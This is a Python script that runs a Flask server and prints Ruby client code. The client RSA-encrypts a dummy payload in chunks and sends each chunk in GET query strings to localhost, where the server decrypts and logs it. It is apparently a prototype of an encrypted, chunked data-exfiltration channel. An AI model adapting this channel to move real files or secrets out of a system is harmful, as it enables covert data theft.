#!/usr/bin/env python3

from flask import Flask, request
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import base64

app = Flask(__name__)

# Step 1: Generate an asymmetric keypair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

pub = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode().replace("\n", "\\n")
ruby_code = f'''
require 'openssl'
require 'base64'
require 'net/http'
require 'uri'

payload = "hello world " * 1000
public_key = OpenSSL::PKey::RSA.new("{pub}")
chunks = payload.scan(/.{"{"}1,#{"{"}public_key.n.num_bytes - 42{"}"}{"}"}/)
midx = (0...10).map {"{"} ('a'..'z').to_a[rand(26)] {"}"}.join
chunks.each_with_index {"{"} |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("http://localhost:5000/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts response.body {"}"}
'''

print(ruby_code)

# Step 2: Implement Flask server
@app.route('/', methods=['GET'])
def handle_request():
    try:
        encrypted_data = request.args.get('n')
        print(f"Received encrypted data: {encrypted_data}")  # Logging the received data

        encrypted_data_bytes = base64.b64decode(encrypted_data)
        print(f"Decoded encrypted data bytes: {encrypted_data_bytes}")  # Logging the decoded bytes

        decrypted_data = private_key.decrypt(
            encrypted_data_bytes,
            padding.PKCS1v15()  # Using PKCS#1 v1.5 padding for decryption
        )

        print(f"Decrypted data: {decrypted_data}")  # Logging the decrypted data
        return decrypted_data
    except Exception as e:
        print(f"Error: {str(e)}")  # Detailed error logging
        return f"Decryption failed: {str(e)}", 500


if __name__ == '__main__':
    app.run()
